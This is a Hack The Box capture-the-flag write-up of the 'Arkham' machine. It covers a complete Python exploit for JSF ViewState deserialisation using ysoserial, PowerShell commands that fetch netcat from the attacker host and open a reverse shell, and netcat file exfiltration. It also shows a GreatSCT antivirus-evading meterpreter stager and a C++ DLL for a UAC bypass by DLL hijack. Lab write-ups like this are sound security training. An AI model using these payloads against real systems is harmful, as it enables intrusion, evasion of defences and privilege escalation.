---
title: Hack The Box - Arkham
tags: [HTB, Webapp Exploit, nmap, SMB, LUKS, ysoserial, Java Deserialisation Exploit, meterpreter, Antivirus Evasion, Python, PSRemoting, UAC Bypass, DLL Hijack]
layout: post
---                                                                  

Arkham was definitely more difficult than its rating would have you believe! In particular, the java deserialisation exploit required a fair bit of research and testing. The combination of UAC bypass / DLL hijack was a nice touch for the privesc. I refer to this post every now-and-then when I need to copy/paste code for writing/compiling a simple DLL :)

## Summary
- SMB - Mounting shares
- LUKS encrypted image
- Java Server Faces 
  - Viewstate encryption/decryption
  - JSF Viewstate Deserialisation vuln
- Evasion
  - Windows Defender evasion for meterpreter  
- Privesc
  - Ez mode (root.txt only)
  - Hard Mode (UAC bypass via DLL hijack)
  
 ![Image](/assets/img/arkham/arkham_info.PNG) 
  
---
## Port Scan
`nmap -sC -sV -v -o nmap-arkham.txt  10.10.10.130`
```
Nmap scan report for 10.10.10.130
Host is up (0.37s latency).
Not shown: 995 filtered ports
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
8080/tcp open  http          Apache Tomcat 8.5.37
| http-methods: 
|   Supported Methods: GET HEAD POST PUT DELETE OPTIONS
|_  Potentially risky methods: PUT DELETE
|_http-title: Mask Inc.
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -3m03s, deviation: 0s, median: -3m03s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2019-04-15 06:38:08
|_  start_date: N/A
```
---
## SMB Enumeration
The host allowed me to enumerate SMB shares via a null session.
`smbclient -L \\10.10.10.130`
```
	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	BatShare        Disk      Master Wayne's secrets
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	Users           Disk
```

BatShare looked interesting...

`smbclient \\\\10.10.10.130\\BatShare`
```
smb: \> dir
  .                                   D        0  Sun Feb  3 08:00:10 2019
  ..                                  D        0  Sun Feb  3 08:00:10 2019
  appserver.zip                       A  4046695  Fri Feb  1 01:13:37 2019
```

The .zip file looked juicy ... But grabbing it from the share via `smbclient` was troublesome due to its size. I needed to mount the share, which meant installing cifs-utils in Kali.

1. Install the CIFS Utils package: `apt-get install cifs-utils`
2. Create a mount point: `mkdir /mnt/bashare`
3. Mount the share: `mount -t cifs //10.10.10.130/BatShare /mnt/bashare`

---
## LUKS Encrypted image
The .zip file contained two files:
- backup.img - Linux Unified Key Setup (LUKS) encrypted image file
- IMPORTANT.TXT - A message to Alfred from Batman telling him the image file is a backup from a linux server

LUKS is the standard used by linux and other OSs for performing whole disk encryption. Hashcat is able to attempt cracking of LUKS encrypted files by sending guesses of the key through the same salt, iterations and cipher process used to generate a hash of the master key, and comaring the result to the hash of the master key. This process is slow (depending on your hardware) - I tried this with the `rockyou` wordlist in Kali and it would have taken me literal years...

1. Create a small wordlist for cracking (I got lucky with a dumb guess here...) `grep -i "bat" /usr/share/wordlists/rockyou.txt > batwords.txt`
2. Pass the encrypted image file to hashcat with my wordlist `hashcat -m 14600 -a 0 -w 3 backup.img batwords.txt -o password.txt`
  - Success! The password was `batmanforever`
3. Mount the encrypted image file and enter the password when prompted `losetup /dev/loop0 backup.img`

Navigating to the newly-mounted volume allowed me to see a few random batman images and a folder called `tomcat-stuff`
This folder contained a bunch of xml config files for an apache tomcat webserver hosting a Java Server Faces application. One file in particular called `web.xml.bak` contained some particularly interesting values...

```
</context-param>
<context-param>
<param-name>org.apache.myfaces.SECRET</param-name>
<param-value>SnNGOTg3Ni0=</param-value>
</context-param>
    <context-param>
        <param-name>org.apache.myfaces.MAC_ALGORITHM</param-name>
        <param-value>HmacSHA1</param-value>
     </context-param>
<context-param>
<param-name>org.apache.myfaces.MAC_SECRET</param-name>
<param-value>SnNGOTg3Ni0=</param-value>
</context-param>
```

The [Apache Myfaces Documentation](https://myfaces.apache.org/core20/myfaces-impl-shared/apidocs/org/apache/myfaces/shared/util/StateUtils.html) says that the `org.apache.myfaces.SECRET` and `org.apache.myfaces.MAC_SECRET` values set the (base64 encoded) secret key for encryption and message authentication code used by JSF applications for client-side state saving. This becomes important soon!

---
## Web Enumeration
The IIS web server on port 80 didn't seem to have any content besides the default IIS landing page. The Apache web server on port 8080 looked more interesting. I poked around the app from my browser and found a subscription page before my scanning tools turned up anything useful...
![Image](//assets/img/arkham/webapp_supscribe_page.PNG)
Some googling revealed that the `javax.faces.viewstate` value contains a **serialised** (uh oh...) **java object** that is encrypted, and used to store information about what information from a page should be displayed.
Circling back to [The Documentation](https://myfaces.apache.org/core20/myfaces-impl-shared/apidocs/org/apache/myfaces/shared/util/StateUtils.html) - we now know that we are sending an encrypted, base64 encoded, HMAC signed serialised java object to the server! **If we can replace the serialised object with our own payload and correctly encrypt, sign and encode it... We should be able to get the server to deserialise it and hopefully execute code for us!**

To summarise what we know about how the server is expecting to decrypt our viewstate:
```
This Class exposes a handful of methods related to encryption, compression and serialization of the view state.

ISO-8859-1 is the character set used.
Base64 is used for all encoding and decoding.
DES is the default encryption algorithm
ECB is the default mode
PKCS5Padding is the default padding
HmacSHA1 is the default MAC algorithm
```
---
## Creating a payload
Before we bother writing our "exploit" we need to be able to reliably create a serialised java object (our payload) that will execute our code. Turns out I'm both lazy and able to take a hint... So when I stumbled upon [ysoserial](https://github.com/frohoff/ysoserial): A proof-of-concept tool for generating payloads that exploit unsafe Java Object deserialisation" I saved myself a little time. 

Through a **painful** process of elimination I worked out that the `CommonsCollections5` payload allowed me to reliably execute code on the victim machine.

After downloading the .jar file from JitPack, creating payloads with ysoserial is simple
`java -jar ysoserial.jar <payload> '<command>'`

---
## Writing the exploit - Bringing it all together
Here's my python script which creates a payload with ysoserial, pads the payload (PKCS5#), encrypts the padded payload (DES, ECB mode), HMAC signs it, then base64 encodes it. the `org.apache.myfaces.SECRET` and `org.apache.myfaces.MAC_SECRET` values are used for encryption and signing. Finally, my script performs a HTTP POST to the vulnerable web server with our new malicious viewstate  value.

```
#!/usr/bin/python

import base64
from Crypto.Cipher import DES
from hashlib import sha1
import hmac
import urllib
import os
import sys
import requests

key = base64.b64decode('SnNGOTg3Ni0=')

def generate_payload(command):
    os.system("java -jar ysoserial/ysoserial.jar CommonsCollections5 \"" + command + "\" > payload.dat")
    with open("payload.dat", "r") as f:
        payload = f.read()
    f.close()
    os.system("rm payload.dat")
    return payload

def pad(data): # PKCS5# implementation
    #Check how many bytes need to be added to make data size a multiple of 8 
    if len(data) % 8 != 0:
        num_bytes = 8 - (len(data) % 8)
        #Append the padding value <padding value> times to the datai
        for i in range(num_bytes):
               data += chr(num_bytes)
    return data

def encrypt(data):
    des_cipher = DES.new(key, DES.MODE_ECB)
    payload = ""
    data_padded = pad(data)
    # DES encrypt - ECB Mode = 8 bytes at a time after PKCS#5 padding
    for i in xrange(0, len(data_padded), 8):
        chunk = data_padded[i:(i+8)]
        payload += des_cipher.encrypt(chunk)
    return payload

def hmac_sign(data):
    signature = hmac.new(key, data, sha1)
    return signature.digest() # Change to hexdigest() if hex string is needed

def http_post(viewstate):
    target = "http://10.10.10.130:8080/userSubscribe.faces"
    cookie = {"JSESSIONID":"C4274895F271999225D9892E92A1ABAD"}
    params = {
        "j_id_jsp_1623871077_1%3Aemail":"test@test.com",
        "j_id_jsp_1623871077_1%3Asubmit":"SIGN UP",
        "j_id_jsp_1623871077_1_SUBMIT":"1",
        "javax.faces.ViewState":viewstate
        }
    r = requests.post(target, cookies=cookie, data=params)

if len(sys.argv) != 2:
    print "Usage: python %s <command>" %sys.argv[0]
else:
    payload = generate_payload(sys.argv[1])
    payload_encrypted = encrypt(payload)
    payload_signed = payload_encrypted + hmac_sign(payload_encrypted)
    viewstate = base64.b64encode(payload_signed)
    http_post(viewstate)
```

Aaand ...success! Now to turn our RCE into a reverse shell. 
![Image](/assets/img/arkham/exploit_ping.PNG)

---

## From Code Execution to a Stable Shell

Before we can make the remote machine give us a shell we must give it a shell to execute. This means we need it to download and execute a binary or script from our attacker machine. There are a bunch of different methods we could try here. The easiest method is probably going to be Powershell. 

Firstly, we need to have a reliable payload to serve up that will provide us with a shell when executed. I'm going to try the netcat PE included in Kali like so:

1. Move a copy of the netcat binary to a convenient location `cp /usr/share/windows-binaries/nc.exe .`
2. Spool up a simple web server `python -m SimpleHTTPServer 80`

Now to use powershell to download our binary... We'll output nc.exe to a directory that can be written-to and executed-from: `C:\Windows\System32\spool\drivers\color\` should do the trick.

Powershell makes cmdlets and classes from the .NET Framework available for downloading via HTTP, including:
1. System.Net.WebClient
2. Start-BitsTransfer 
3. Invoke-WebRequest
4. Probably a bunch of other ones too

I eventually found success with the `Invoke-WebRequest` cmdlet!

`python exploit.py 'Powershell Invoke-WebRequest -URI "http://10.10.14.9/nc.exe -OutFile C:\Windows\System32\spool\drivers\color\nc.exe"; C:\Windows\System32\spool\drivers\color\nc.exe -e cmd.exe 10.10.14.9 443`

![Image](/assets/img/arkham/exploit_rev_shell.PNG)

---

## User: Alfred to Batman

It seems our shell is running as the user `alfred`; however there's another user on the box named `Batman` who has local administrator privileges. At least we now have access to `user.txt`!

```
C:\tomcat\apache-tomcat-8.5.37\bin>whoami
whoami
arkham\alfred

C:\tomcat\apache-tomcat-8.5.37\bin>net user
net user

User accounts for \\ARKHAM

-------------------------------------------------------------------------------
Administrator            Alfred                   Batman                   
DefaultAccount           Guest                    WDAGUtilityAccount       
The command completed successfully.


C:\tomcat\apache-tomcat-8.5.37\bin>net user Batman
net user Batman
User name                    Batman
Full Name                    
Comment                      
User's comment               
Country/region code          001 (United States)
Account active               Yes
Account expires              Never

Password last set            2/3/2019 9:25:50 AM
Password expires             Never
Password changeable          2/3/2019 9:25:50 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script                 
User profile                 
Home directory               
Last logon                   9/20/2019 4:57:04 PM

Logon hours allowed          All

Local Group Memberships      *Administrators       *Remote Management Use
                             *Users                
Global Group memberships     *None                 
The command completed successfully.
```

Alfred's Downloads directory contains a file called `backup.zip` which looked interesting. We can bring it back to our local machine to unzip it:
1. Start a local netcat listener `nc -lnvp 443 > backup.zip`
2. From our shell, send the file back to our local machine via the netcat binary we've already uploaded `C:\Windows\System32\spool\drivers\color\nc.exe 10.10.14.9 443 < C:\Users\Alfred\Downloads\backups\backup.zip`

Unzipping the file reveals an Outlook Data File `alfred@arkham.local.ost`. Kali has tools to process OST and PST files which we can use to rebuild a mailbox.

```
root@kali:~/Desktop/hackthebox/Arkham-10.10.10.130# readpst -rS alfred@arkham.local.ost 
Opening PST file and indexes...
Processing Folder "Deleted Items"
Processing Folder "Inbox"
Processing Folder "Outbox"
Processing Folder "Sent Items"
Processing Folder "Calendar"
	"Inbox" - 0 items done, 7 items skipped.
Processing Folder "Contacts"
Processing Folder "Conversation Action Settings"
Processing Folder "Drafts"
	"Calendar" - 0 items done, 3 items skipped.
Processing Folder "Journal"
Processing Folder "Junk E-Mail"
Processing Folder "Notes"
Processing Folder "Tasks"
Processing Folder "Sync Issues"
Processing Folder "RSS Feeds"
Processing Folder "Quick Step Settings"
	"alfred@arkham.local.ost" - 15 items done, 0 items skipped.
	"Drafts" - 1 items done, 0 items skipped.
Processing Folder "Conflicts"
Processing Folder "Local Failures"
Processing Folder "Server Failures"
	"Sync Issues" - 3 items done, 0 items skipped.
```

The mailbox structure has now been rebuilt under the working directory. In the Drafts folder we see 1 draft email from Alfred to Batman that says "Master Wayne Stop forgetting your password", and an image file which contains Batman's password: `Zx^#QZN+T!123`.
![Image](/assets/img/arkham/batman_password.PNG)

With Batman's credentials I should now be able to use Powershell to change users. One method is to use my existing shell to 'remote' into the localhost using Batman's Creds with the `Enter-PSSession` cmdlet.

```
C:\tomcat\apache-tomcat-8.5.37\bin>powershell
powershell
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\tomcat\apache-tomcat-8.5.37\bin> $Username = "Batman"
$Username = "Batman"
PS C:\tomcat\apache-tomcat-8.5.37\bin> $Password = 'Zx^#QZX+T!123'
$Password = 'Zx^#QZX+T!123'
PS C:\tomcat\apache-tomcat-8.5.37\bin> $SecurePass = ConvertTo-SecureString -AsPlainText -Force $Password
$SecurePass = ConvertTo-SecureString -AsPlainText -Force $Password
PS C:\tomcat\apache-tomcat-8.5.37\bin> $Creds = New-Object System.Management.Automation.PSCredential($Username,$SecurePass)
$Creds = New-Object System.Management.Automation.PSCredential($Username,$SecurePass)
PS C:\tomcat\apache-tomcat-8.5.37\bin> Enter-PSSession -Credential $Creds -ComputerName arkham   
Enter-PSSession -Credential $Creds -ComputerName arkham 
[arkham]: PS C:\Users\Batman\Documents> whoami
whoami
arkham\batman
```

Another way would be to use the `Invoke-Command` cmdlet to give myself another reverse shell as batman, once again using netcat

```
C:\tomcat\apache-tomcat-8.5.37\bin>powershell
powershell
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\tomcat\apache-tomcat-8.5.37\bin> $Username = "Batman"
$Username = "Batman"
PS C:\tomcat\apache-tomcat-8.5.37\bin> $Password = 'Zx^#QZX+T!123'
$Password = 'Zx^#QZX+T!123'
PS C:\tomcat\apache-tomcat-8.5.37\bin> $SecurePass = ConvertTo-SecureString -AsPlainText -Force $Password
$SecurePass = ConvertTo-SecureString -AsPlainText -Force $Password
PS C:\tomcat\apache-tomcat-8.5.37\bin> $Creds = New-Object System.Management.Automation.PSCredential($Username,$SecurePass)
$Creds = New-Object System.Management.Automation.PSCredential($Username,$SecurePass)
Invoke-Command -ComputerName arkham -Credential $Creds -ScriptBlock {C:\Windows\System32\spool\drivers\color\nc.exe -e cmd.exe 10.10.14.9 443}
```
```
root@kali:~/Desktop/hackthebox/Arkham-10.10.10.130# nc -nvlp 443
listening on [any] 443 ...
connect to [10.10.14.15] from (UNKNOWN) [10.10.10.130] 49707
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.
 
C:\Users\Batman\Documents>whoami
whoami
arkham\batman
 
C:\Users\Batman\Documents>
```

Unfortunately, even as Batman, we get "Access Denied" when trying to view root.txt. 

---
## Root.txt (Easy Mode)

Although I couldn't access root.txt from the filesytem directly, mapping a drive to the local filesystem worked...

```
C:\Users\Batman\Desktop>net use q: \\arkham\users\administrator
net use q: \\arkham\users\administrator
The command completed successfully.
 
 
C:\Users\Batman\Desktop>q:
q:
 
Q:\>type Desktop\root.txt
type Desktop\root.txt
6367************************4fdb
```

---
## Privilege Escalation (Hard Mode) - UAC Bypass via DLL Hijack

Despite the `Batman` user account being in the Administrators localgroup, our permissions are limited. **This is because of Windows' User Account Control (UAC) security feature**. When we spawn a new cmd.exe process as Batman, UAC needs to prompt a user on the desktop for consent because our cmd process is requesting an administrator access token. There's nobody sitting on the desktop to click the UAC prompt for us, so our cmd.exe process never gets a full administrator token and we're stuck with default privileges.

```
C:\Users\Batman\Documents>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State  
============================= ============================== =======
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

To elevate privileges we need to find a way to bypass the UAC prompt when requesting an administrator token for our newly spawned process. One way of achieving this is to find "Auto-elevating" binaries that don't require a user to accept a UAC prompt - through which we can attempt to perform a DLL hijack.

This post <https://egre55.github.io/system-properties-uac-bypass/> shows that `SystemPropertiesAdvanced.exe` is vulnerable to UAC bypass via DLL hijacking, because it is configured to Auto-Elevate, which we can confirm by checking the embedded manifest:

```
C:\Users\Batman\Documents>findstr /C:"<autoElevate>true" C:\windows\SysWOW64\SystempropertiesAdvanced.exe
findstr /C:"<autoElevate>true" C:\windows\SysWOW64\SystempropertiesAdvanced.exe
        <autoElevate>true</autoElevate>
```

And because when executed, it attempts to load the DLL "srrstr.dll" from the WindowsApps folder, which is included in our `PATH` environment variable:

```
C:\Users\Batman\Documents>echo %PATH%
echo %PATH%
C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Users\Batman\AppData\Local\Microsoft\WindowsApps
```

This means that if we can place a malicious DLL in `C:\Users\Batman\AppData\Local\Microsoft\WindowsApps` called **srrstr.dll**, then execute `SystemPropertiesAdvanced.exe` from a medium-integrity process, srrstr.dll (and any of its child processes) will be spawned as a high-integrity process!

**But there's still one more problem to overcome...**

Our UAC bypass needs to be applied to an *interactive process* running as a standard user, otherwise the elevation of privileges won't be correctly applied to the newly-spawned process. This means that we need to execute `SystemPropertiesAdvanced.exe` from an interactive process.

To achieve this, I'll use meterpreter's functionality to find interactive processes and migrate into one before executing our UAC bypass / DLL hijack. In order to get meterpreter running on the victim host, we'll also need to obfuscate our meterpreter payload otherwise Windows Defender will stop us in our tracks. 

---
### Meterpreter Antivirus Evasion 

I've previously had success with a tool called [Ebowla](https://github.com/Genetic-Malware/Ebowla) but it's no-longer supported so I'll give [GreatSCT](https://github.com/GreatSCT/GreatSCT) a go. According to its GitHub page, "GreatSCT is a tool designed to generate metasploit payloads that bypass common anti-virus solutions and application whitelisting solutions".

Setting up GreatSCT is pretty straightforward
1. Clone the repo: `git clone https://github.com/GreatSCT/GreatSCT.git`
2. Navigate to the setup directory `cd GreatSCT/setup`
3. Run the setup script `sudo ./setup.sh -c`

After some time, GreatSCT should be good to go and I can use it to generate my own meterpreter payload. 

```
===============================================================================
                                   Great Scott!
===============================================================================
      [Web]: https://github.com/GreatSCT/GreatSCT | [Twitter]: @ConsciousHacker
===============================================================================

 Payload information:

	Name:		Pure MSBuild C# Reverse TCP Stager
	Language:	msbuild
	Rating:		Excellent
	Description:    pure windows/meterpreter/reverse_tcp stager, no
	                shellcode

Payload: msbuild/meterpreter/rev_tcp selected

Required Options:

Name            	Value   	Description
----            	-----   	-----------
DOMAIN          	X       	Optional: Required internal domain
EXPIRE_PAYLOAD  	X       	Optional: Payloads expire after "Y" days
HOSTNAME        	X       	Optional: Required system hostname
INJECT_METHOD   	Virtual 	Virtual or Heap
LHOST           	10.10.14.15	IP of the Metasploit handler
LPORT           	443     	Port of the Metasploit handler
PROCESSORS      	X       	Optional: Minimum number of processors
SLEEP           	X       	Optional: Sleep "Y" seconds, check if accelerated
TIMEZONE        	X       	Optional: Check to validate not in UTC
USERNAME        	X       	Optional: The required user account

 Available Commands:

	back        	Go back
	exit        	Completely exit GreatSCT
	generate    	Generate the payload
	options     	Show the shellcode's options
	set         	Set shellcode option

[msbuild/meterpreter/rev_tcp>>] 

```

Once I've told GreatSCT to generate the payload with these options, it provides us with a metasploit RC file to make things easier, and also an XML file so that `msbuild.exe` on the remote machine can compile our meterpreter shell for us!

```
===============================================================================
                                   Great Scott!
===============================================================================
      [Web]: https://github.com/GreatSCT/GreatSCT | [Twitter]: @ConsciousHacker
===============================================================================

 [*] Language: msbuild
 [*] Payload Module: msbuild/meterpreter/rev_tcp
 [*] MSBuild compiles for  us, so you just get xml :)
 [*] Source code written to: /usr/share/greatsct-output/source/revshell.xml
 [*] Metasploit RC file written to: /usr/share/greatsct-output/handlers/revshell.rc

Please press enter to continue >:
```

Now I can spin up the Metasploit framework using the provided RC file. This will automatically start a `multi/handler` configured to catch our reverse shell. `msfconsole -r /usr/share/greatsct-output/handlers/revshell.rc`

All that's left to do is get our xml file across to the victim host, compile it and execute!

1. From our netcat cmd shell as Batman, download the XML file: `Powershell Invoke-WebReqquest -URI http://10.10.14.9/revshell.xml -OutFile revshell.xml`
2. From the same shell, compile it using the **32 bit** msbuild.exe compiler: `C:\windows\microsoft.net\framework\v4.0.30319\MSBuild.exe revshell.xml`
3. And over in our `multi/handler` we should have a meterpreter session!

```
[*] Started reverse TCP handler on 10.10.14.9:443 
msf5 exploit(multi/handler) > [*] Sending stage (180291 bytes) to 10.10.10.130
[*] Meterpreter session 1 opened (10.10.14.9:443 -> 10.10.10.130:49698) at 2019-09-22 03:51:12 -0400

msf5 exploit(multi/handler) > sessions -i 1
[*] Starting interaction with 1...

meterpreter > 
```

From our new meterpreter session I can enumerate running processes with the `ps` command. Below is a cut-down version of the output:

```
meterpreter > ps

Process List
============

 PID   PPID  Name                       Arch  Session  User           Path
 ---   ----  ----                       ----  -------  ----           ----
 0     0     [System Process]                                         
 4     0     System                                                   
 76    624   SecurityHealthService.exe                                                                  
 368   776   wsmprovhost.exe            x64   0        ARKHAM\Batman  C:\Windows\System32\wsmprovhost.exe     
 4308  624   svchost.exe                                              
 4460  1020  sihost.exe                 x64   1        ARKHAM\Batman  C:\Windows\System32\sihost.exe
 4480  624   svchost.exe                x64   1        ARKHAM\Batman  C:\Windows\System32\svchost.exe
 4512  368   nc.exe                     x86   0        ARKHAM\Batman  C:\Windows\System32\spool\drivers\color\nc.exe
 4520  1020  taskhostw.exe              x64   1        ARKHAM\Batman  C:\Windows\System32\taskhostw.exe
 4752  776   WmiPrvSE.exe                                             
 4780  372   ctfmon.exe                 x64   1                       
 4800  776   ShellExperienceHost.exe    x64   1        ARKHAM\Batman  C:\Windows\SystemApps\ShellExperienceHost_cw5n1h2txyewy\ShellExperienceHost.exe
 5004  4960  explorer.exe               x64   1        ARKHAM\Batman  C:\Windows\explorer.exe
 5040  1036  conhost.exe                                              
 5080  776   SearchUI.exe               x64   1        ARKHAM\Batman  C:\Windows\SystemApps\Microsoft.Windows.Cortana_cw5n1h2txyewy\SearchUI.exe

```

A value of 1 in the "Session" column indicates an interactive process. Now to try and migrate to one of these by using the `migrate` command and specifying the PID of the desired process. Let's go with explorer.exe

```
meterpreter > migrate 5004
[*] Migrating from 1856 to 5004...
[*] Migration completed successfully.
```

---

### Creating a malicious DLL

I used this article <https://www.gracefulsecurity.com/privesc-dll-hijacking/> for creating and compiling a tiny dll payload in C++ that would execute the same meterpreter payload with elevated privileges using the WinExec() function from the Windows API. I even left in the cringey 'fireLazor()' function name.

```
root@kali:~/Desktop/hackthebox/Arkham-10.10.10.130/dll# cat main.cpp 
#include <windows.h>
int fireLazor()
{
 WinExec("C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\MSBuild.exe C:\\Users\\Batman\\Documents\\revshell.xml", 0);
 return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
 fireLazor();
 return 0;
}
```

I used mingw to compile it from Kali
- ``i686-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp``
- ``i686-w64-mingw32-g++ -shared -o srrstr.dll main.o -Wl,--out-implib,main.a``

Now I can copy the DLL to the WindowsApps directory using the methods previoulsy shown.
1. Start HTTP server from Kali ``python -m SimpleHTTPServer 80``
2. From our meterpreter session, drop into a cmd shell with the `shell` command
2. Use Powershell to download the dll into WindowsApps `Powershell Invoke-WebRequest -URI http://10.10.14.15/dll/srrstr.dll -OutFile C:\Users\Batman\AppData\Local\Microsoft\WindowsApps\srrstr.dll`

---
### Bringing It All Together

By now, I should have my meterpreter shell on the victim box running in an interactive process and my DLL payload in place. All that's left to do is run the vulnerable executable `C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe`. This executable should auto-elevate without requiring the user to accept a UAC prompt, then find and execute our DLL payload at `C:\Users\Batman\AppData\Local\Microsoft\WindowsApps\srrstr.dll` which then runs another instance of our meterpreter payload via `msbuild.exe` in a high-integrity level. If all goes well, my `multi/handler` should still be listening in the background for additional reverse shell connections so I should see the additional session open in the same window. 

```
C:\Windows\system32>c:\windows\syswow64\systempropertiesadvanced.exe
c:\windows\syswow64\systempropertiesadvanced.exe

C:\Windows\system32>
[*] Sending stage (180291 bytes) to 10.10.10.130
[*] Meterpreter session 2 opened (10.10.14.9:443 -> 10.10.10.130:49703) at 2019-09-22 04:16:59 -0400
[*] Sending stage (180291 bytes) to 10.10.10.130
[*] Meterpreter session 3 opened (10.10.14.9:443 -> 10.10.10.130:49702) at 2019-09-22 04:17:03 -0400
^Z
Background channel 1? [y/N]  y
meterpreter > background
[*] Backgrounding session 1...
msf5 exploit(multi/handler) > sessions -i 2
[*] Starting interaction with 2...

meterpreter > shell
Process 3780 created.
Channel 1 created.
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\users\batman\documents>whoami
whoami
arkham\batman

C:\users\batman\documents>type c:\users\administrator\desktop\root.txt
type c:\users\administrator\desktop\root.txt
6367************************4fdb
    
C:\users\batman\documents>
```

And it's worked! Above, I've backgrounded the "channel" that my cmd shell was runining in, as well as the first meterpreter session. I've then switched to interacting with the 2nd meterpreter session which is running with our elevated privileges. You can see here that we can now read to root flag without needing to mount.

---

## Thanks! 

If you actually made it this far down the page, I really appreciate it. Thanks for reading. This is the first of hopefully many writeups. I learned a lot from this box, and hopefully you've learned something new by slogging through this post. If you think I've missed something, have questions or requests for writeups please let me know. <apr4h.ctf@gmail.com>  

## Final interesting note: 

After getting the root flag, I wanted to double-check what privileges I actually had with my elevated Batman shell. `whoami /groups` confirmed that I was running in a high-integrity level but interestingly, `whoami /priv` showed in my new shell, `SeImpersonatePrivilege` is enabled, which should mean that further privilege escalation to NT AUTHORITY\SYSTEM is possible via the [Juicy Potato exploit](https://github.com/ohpe/juicy-potato). I'm too lazy to test for a valid CLSID right now but might come back and give this a crack at some stage... 
